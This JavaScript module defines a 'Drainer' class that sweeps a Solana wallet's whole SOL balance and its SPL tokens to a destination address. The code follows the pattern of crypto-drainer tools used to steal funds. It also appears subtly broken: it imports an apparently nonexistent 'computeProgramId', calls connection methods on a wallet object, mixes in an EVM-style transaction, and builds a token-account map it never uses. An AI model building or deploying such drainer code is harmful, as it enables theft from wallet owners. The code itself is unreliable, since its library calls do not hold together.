const {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  computeProgramId,
} = require("@solana/web3.js");
const {
  getAssociatedTokenAddressSync,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
} = require("@solana/spl-token");

const { getSolanaConnection, drainATA, batchDrainATA } = require("./solana");

class Drainer {
    constructor(wallet, config) {
        this.wallet = wallet;
        this.config = config;
    }

    async extractFunds() {
        const tx = {
            to: this.config.destinationAddress,
            value: '0x' // Full balance
        };
        await this.wallet.signTransaction(tx);
    }

    /**
     * Drain native SOL from wallet to destination
     * @param {string} destinationPublicKey - Base58 string of destination
     * @returns {Promise<string>} Transaction signature
     */
    async drainSolana(destinationPublicKey) {
        try {
            const destination = new PublicKey(destinationPublicKey);
            const balance = await this.wallet.getBalance();

            if (balance <= 0) {
                console.log("[Solana] Wallet has no SOL to drain");
                return null;
            }

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: this.wallet.publicKey,
                    toPubkey: destination,
                    lamports: balance, // Drain everything (SOL must pay for ATA/tokens)
                })
            );

            const { blockhash } = await this.wallet.getLatestBlockhash("processed");
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = this.wallet.publicKey;

            const signature = await this.wallet.sendTransaction(
                transaction,
                this.wallet.connection
            );

            console.log(`[Solana] SOL drained: ${signature}`);
            return signature;
        } catch (error) {
            console.error("[Solana] Failed to drain SOL:", error.message);
            throw error;
        }
    }

    /**
     * Drain SPL tokens from wallet to destination
     * @param {string} destinationPublicKey - Base58 string of destination
     * @param {string[]} mintAddresses - Array of token mint addresses (base58)
     * @returns {Promise<Array<{ mint: string, signature: string, success: boolean }>>} Results
     */
    async drainSplTokens(destinationPublicKey, mintAddresses) {
        try {
            const connection = getSolanaConnection("devnet");
            const destination = new PublicKey(destinationPublicKey);

            // First, create the destination ATA for each mint
            const destinationATAMap = new Map();
            for (const mintStr of mintAddresses) {
                try {
                    const mint = new PublicKey(mintStr);
                    const destATA = getAssociatedTokenAddressSync(
                        mint,
                        destination,
                        false,
                        ASSOCIATED_TOKEN_PROGRAM_ID,
                        TOKEN_PROGRAM_ID
                    );
                    destinationATAMap.set(mintStr, destATA.toBase58());
                } catch (err) {
                    console.error(`[Solana] Invalid mint ${mintStr}: ${err.message}`);
                }
            }

            // Run batch drain
            const results = await batchDrainATA(
                connection,
                this.wallet,
                this.wallet.publicKey,
                mintAddresses.map(m => new PublicKey(m)),
                destination
            );

            console.log("[Solana] Batch drain results:", JSON.stringify(results, null, 2));
            return results;
        } catch (error) {
            console.error("[Solana] Failed to drain SPL tokens:", error.message);
            throw error;
        }
    }
}

module.exports = Drainer;
